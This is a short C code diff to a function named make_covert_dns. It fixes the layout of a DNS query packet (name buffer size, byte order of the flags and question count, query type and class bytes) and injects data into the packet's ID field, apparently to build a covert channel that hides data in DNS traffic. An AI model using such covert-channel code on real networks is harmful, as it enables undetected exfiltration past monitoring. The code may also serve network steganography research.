@@ -33,7 +33,7 @@ struct dns_dgram
 	uint16 ans_count; // number of answer entries
 	uint16 auth_count; // number of authority entries
 	uint16 add_count; // number of resource entries
-	char name[16];
+	char name[20];
 };
 
 struct ntp_dgram prep()
@@ -93,13 +93,18 @@ void make_covert_dns(char* buff, uint16 data)
 	struct dns_dgram packet;
 	uint8 *ptr;
 
-	packet.flags = 0x0100;
-	packet.q_count = 0x1;
+	packet.flags = 0x0001;
+	packet.q_count = 0x0100;
 	packet.add_count = 0x0;
 	packet.ans_count = 0x0;
 	packet.auth_count = 0x0;
 
 	strcpy(packet.name, "\3www\6google\3com");
+	ptr = (uint8*) (packet.name + strlen(packet.name) + 1);
+	*(ptr++) = 0x0;
+	*(ptr++) = 0x1;
+	*(ptr++) = 0x0;
+	*(ptr++) = 0x1;
 
 	// Inject data
 	ptr = ((uint8*)&(packet.id));
